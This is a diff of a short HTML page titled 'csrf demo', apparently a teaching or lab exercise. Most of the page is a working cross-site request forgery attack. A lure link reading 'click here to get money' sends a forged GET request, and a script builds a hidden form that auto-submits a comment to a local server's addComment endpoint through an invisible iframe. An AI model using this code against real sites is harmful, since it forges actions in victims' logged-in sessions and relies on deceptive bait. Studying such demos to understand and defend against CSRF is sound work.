@@ -1,27 +1,38 @@
 <!doctype html>
 <html>
-	<head>
-		<meta charset="utf-8"/>
-		<title>csrf demo</title>
-	</head>
-	<body>
-		hello，这里什么也没有。
-		<script>
-			document.write(`
-				<form name="commentForm" target="csrf" method="post" action="http://localhost:3000/post/addComment">
+
+<head>
+	<meta charset="utf-8" />
+	<title>csrf demo</title>
+</head>
+
+<body>
+	hello，这里什么也没有。
+	<a href="http://localhost:3003/post/addComment?postId=13&content="我是一个get攻击"">点击这里有钱拿</a>
+	<script>
+		document.write(`
+				<form name="commentForm" target="csrf" method="GET" action="http://localhost:3003/post/addComment">
 					<input name="postId" type="hidden" value="13">
 					<textarea name="content">我是一个攻击</textarea>
-				</form>`
-			);
+				</form>
+				`);
 
-			var iframe = document.createElement('iframe');
-			iframe.name = 'csrf';
-			iframe.style.display = 'none';
-			document.body.appendChild(iframe);
+				// document.write(`
+				// <form name="commentForm" target="csrf" method="post" action="http://localhost:3003/post/addComment">
+				// 	<input name="postId" type="hidden" value="13">
+				// 	<textarea name="content">我是一个攻击</textarea>
+				// </form>
+				// `);
+				
+		var iframe = document.createElement('iframe');
+		iframe.name = 'csrf';
+		iframe.style.display = 'none';
+		document.body.appendChild(iframe);
 
-			setTimeout(function(){
-				document.querySelector('[name=commentForm]').submit();
-			},1000);
-		</script>
-	</body>
+		setTimeout(function () {
+			document.querySelector('[name=commentForm]').submit();
+		}, 1000);
+	</script>
+</body>
+
 </html>
